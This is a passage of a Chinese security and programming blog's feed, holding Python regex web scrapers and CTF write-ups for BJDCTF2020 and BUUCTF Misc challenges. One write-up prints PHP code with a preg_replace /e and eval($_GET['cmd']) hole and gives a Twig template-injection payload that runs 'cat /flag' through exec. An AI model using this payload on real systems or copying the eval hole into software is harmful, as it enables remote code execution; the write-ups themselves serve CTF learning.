writer.writerows(list_books)</span><br><span class="line">def main():</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;www.douban.com&#x2F;tag&#x2F;%E5%B0%8F%E8%AF%B4&#x2F;book?start&#x3D;&#123;&#125;&quot;</span><br><span class="line">    books&#x3D;[]</span><br><span class="line">    for i in range(0,136,15):</span><br><span class="line">        url&#x3D;base_url.format(i)</span><br><span class="line">        book&#x3D;spdier(url)</span><br><span class="line">        books +&#x3D;book</span><br><span class="line">    csv_storage(books,&#39;豆瓣图片.csv&#39;)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>今天学习了csv库存储爬取下来的数据，通过这个项目巩固了学习的内容。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;读取csv文件&quot;&gt;&lt;a href=&quot;#读取csv文件&quot; class=&quot;headerlink&quot; title=&quot;读取csv文件&quot;&gt;&lt;/a&gt;读取c
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://da4er.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://da4er.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式_爬取中国古诗词网与豆瓣热门图书</title>
    <link href="https://da4er.top/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6.html"/>
    <id>https://da4er.top/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6.html</id>
    <published>2020-02-15T08:56:46.000Z</published>
    <updated>2020-02-15T09:01:58.294Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="一-爬取中国诗词网"><a href="#一-爬取中国诗词网" class="headerlink" title="一.爬取中国诗词网"></a>一.爬取中国诗词网</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">def handler_url(url):</span><br><span class="line">    header&#x3D;&#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    reponse&#x3D;requests.get(url,header)</span><br><span class="line">    text&#x3D;reponse.text</span><br><span class="line">    titles&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;cont&quot;&gt;.*?&lt;b&gt;(.*?)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    years&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;&lt;a.*?&gt;(.*?)&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    autors&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;.*?&lt;a.*?&gt;.*?&lt;a.*?&gt;(.*?)&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    contents_tmp&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;.*?&lt;div\sclass&#x3D;&quot;contson&quot;\s.*?&gt;(.*?)&lt;&#x2F;div&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    contents&#x3D;[]</span><br><span class="line">    for c in contents_tmp:</span><br><span class="line">        x&#x3D;re.sub(r&#39;&lt;.*?&gt;&#39;,&#39;&#39;,c)</span><br><span class="line">        contents.append(x.strip())</span><br><span class="line">    poems&#x3D;[]</span><br><span class="line">    for value in zip(titles,years,autors,contents):</span><br><span class="line">        title,year,autor,content&#x3D;value</span><br><span class="line">        poem&#x3D;&#123;</span><br><span class="line">            &quot;title&quot;:title,</span><br><span class="line">            &quot;year&quot;:year,</span><br><span class="line">            &quot;autor&quot;:autor,</span><br><span class="line">            &quot;content&quot;:content</span><br><span class="line">        &#125;</span><br><span class="line">        poems.append(poem)</span><br><span class="line">    for a in poems:</span><br><span class="line">        print(a)</span><br><span class="line">def main():</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;www.gushiwen.org&#x2F;default_&#123;&#125;.aspx&quot;</span><br><span class="line">    for i in range(1,7):</span><br><span class="line">        url&#x3D;base_url.format(i)</span><br><span class="line">        handler_url(url)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/4.png" class title="Da4er"><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/5.png" class title="Da4er"><hr><h3 id="二-爬取豆瓣热门图书"><a href="#二-爬取豆瓣热门图书" class="headerlink" title="二.爬取豆瓣热门图书"></a>二.爬取豆瓣热门图书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">HEADERS&#x3D;&#123;</span><br><span class="line">    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line">def get_detail_page(url):</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;HEADERS)</span><br><span class="line">    text&#x3D;resp.text</span><br><span class="line">    detail_pages&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;main-bd&quot;&gt;.*?&lt;a\shref&#x3D;&quot;(.*?)&quot;&gt;.*?&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    return detail_pages</span><br><span class="line">def handle_detail_page(url):</span><br><span class="line">    book&#x3D;&#123;&#125;</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;HEADERS)</span><br><span class="line">    text&#x3D;resp.text</span><br><span class="line">    titles&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;article&quot;&gt;.*?&lt;span.*?&gt;(.*?)&lt;&#x2F;span&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    articles_tmp&#x3D;re.findall(r&#39;&lt;div\sid&#x3D;&quot;link-report&quot;&gt;.*?&lt;p&gt;.*&lt;&#x2F;p&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    articles&#x3D;[]</span><br><span class="line">    for a in articles_tmp:</span><br><span class="line">        x&#x3D;re.sub(r&#39;&lt;.*?&gt;&#39;,&#39;&#39;,a)</span><br><span class="line">        y&#x3D;x.replace(&#39;\r&#39;,&#39;&#39;).replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">        a&#x3D;re.sub(r&#39;&lt;div\s.*?&gt;&#39;,&#39;&#39;,y)</span><br><span class="line">        b&#x3D;a.replace(&#39; &#39;,&#39;&#39;)</span><br><span class="line">        articles.append(b)</span><br><span class="line">    # print(articles)</span><br><span class="line">    # print(titles)</span><br><span class="line">    book&#x3D;&#123;</span><br><span class="line">        &#39;title&#39;:titles,</span><br><span class="line">        &#39;article&#39;:articles</span><br><span class="line">    &#125;</span><br><span class="line">    print(book)</span><br><span class="line">def main():</span><br><span class="line">    urls&#x3D;[]</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;book.douban.com&#x2F;review&#x2F;best&#x2F;?start&#x3D;&#123;&#125;&quot;</span><br><span class="line">    for i in range(0,41,20):</span><br><span class="line">        url&#x3D;base_url.format(i)</span><br><span class="line">        urls.append(url)</span><br><span class="line">    for a in urls:</span><br><span class="line">        detail_urls&#x3D;get_detail_page(a)</span><br><span class="line">        for f in detail_urls:</span><br><span class="line">            handle_detail_page(f)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/1.png" class title="Da4er"><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/2.png" class title="Da4er"><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/3.png" class title="Da4er"><hr><h3 id="三-总结"><a href="#三-总结" class="headerlink" title="三.总结"></a>三.总结</h3><p><strong>这两个小的爬虫项目，网站都没有进行反爬处理，所以说对于我们爬出页面信息还是比较简单的，关键在于数据怎么解析，最近一直在看正则表达式，所以找了两个小的项目练一练，这两个小项目也可以使用beatifulsoup或者xml库进行解析，找时间再试试别的方法解析数据吧~</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;一-爬取中国诗词网&quot;&gt;&lt;a href=&quot;#一-爬取中国诗词网&quot; class=&quot;headerlink&quot; title=&quot;一.爬取中国诗词网&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://da4er.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://da4er.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>2.13 [BJDCTF2020]ZJCTF，不过如此&amp;Cookie is so stable</title>
    <link href="https://da4er.top/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable.html"/>
    <id>https://da4er.top/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable.html</id>
    <published>2020-02-13T05:45:01.000Z</published>
    <updated>2020-02-13T05:46:24.352Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h3><p>打开网页通过阅读源码，知道我们要读到next.php的源码，还要使text文件的内容为”I have a dream”，所以可以使用php伪协议进行写入和读取。</p><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/1.png" class title="Da4er"><p>得到next.php的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line">        &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">@eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用过分析知preg_replace()使用的/e模式可以存在远程执行代码，<a href="https://xz.aliyun.com/t/2557">参考博客</a>，所以我们可以有两种方法进行读取flag。<br>第一种：利用给的getFlag()函数：</p><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/2.png" class title="Da4er"><p>第二种可以通过构造post传参：</p><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/3.png" class title="Da4er"><hr><h3 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h3><p>Twig模板注入：<br>在cookie中存在，因为我们分析题目知，题目会把cookie中的user的值返回到登入后的页面中，而且没有进行过滤。<br>检测是哪种模板注入：输入49显示的是49，而不是7个7，说明是Twig模板注入，可以直接使用payload进行读取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;;</span><br></pre></td></tr></table></figure><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/4.png" class title="Da4er"><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/5.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;ZJCTF，不过如此&quot;&gt;&lt;a href=&quot;#ZJCTF，不过如此&quot; class=&quot;headerlink&quot; title=&quot;ZJCTF，不过如此
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.13 BUUCTF Misc john-in-the-middle&amp;谁赢了比赛&amp;二维码&amp;小易的U盘&amp;黑客帝国&amp;真的很杂</title>
    <link href="https://da4er.top/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82.html"/>
    <id>https://da4er.top/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82.html</id>
    <published>2020-02-13T03:31:57.000Z</published>
    <updated>2020-02-13T03:35:09.365Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h3><hr><p>打开流量包发现全是tcp,http协议，直接导出http对象。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/1.png" class title="Da4er"><p>在http对象中有个logo.png，Stegsolve工具打开，分析颜色通道得到flag。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/2.png" class title="Da4er"><hr><h3 id="谁赢了比赛"><a href="#谁赢了比赛" class="headerlink" title="谁赢了比赛"></a>谁赢了比赛</h3><hr><p>binwalk分析一下发现里面有个压缩包，再用foremost分离出来，发现gif有秘密，爆破一下。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/3.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/4.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/5.png" class title="Da4er"><p>分析gif图片，在第310帧发现假的flag，再用Stegsolve工具分析各个颜色通道，得到flag。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/6.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/7.png" class title="Da4er"><hr><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>二维码被撕碎了，只能用ps拼接，拼接完扫描得到flag。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/8.png" class title="Da4er"><hr><h3 id="小易的u盘"><a href="#小易的u盘" class="headerlink" title="小易的u盘"></a>小易的u盘</h3><p>binwalk分离出两个压缩包</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/9.png" class title="Da4er"><p>打开发现有很多exe文件，分析exe文件发现有个exe文件的创造时间不同，直接用ida反编译这个文件，便可得到flag。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/10.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/11.png" class title="Da4er"><hr><h3 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h3><p>题目是个txt文件，打开发现rar文件头，在winhex里直接hex转ascii查看。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/12.png" class title="Da4er"><p>保存为压缩包，有秘密爆破一下。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/13.png" class title="Da4er"><p>解压后发现一个损坏的png图片，查看一下16进制发现是jpg的图片，直接将png的文件头改成jpg文件头，便可得到flag。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/14.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/15.png" class title="Da4er"><hr><h3 id="真的很杂"><a href="#真的很杂" class="headerlink" title="真的很杂"></a>真的很杂</h3><p>foremost出来一个压缩包，打开压缩包发现是apk文件，直接改后缀名，然后用jadx工具反编译一下，便可得到flag。</p><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/16.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/17.png" class title="Da4er"><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/18.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;john-in-the-middle&quot;&gt;&lt;a href=&quot;#john-in-the-middle&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.12 浅谈SSI和SSTI漏洞</title>
    <link href="https://da4er.top/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E.html"/>
    <id>https://da4er.top/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E.html</id>
    <published>2020-02-12T09:35:03.000Z</published>
    <updated>2020-02-12T09:38:52.428Z</updated>
    
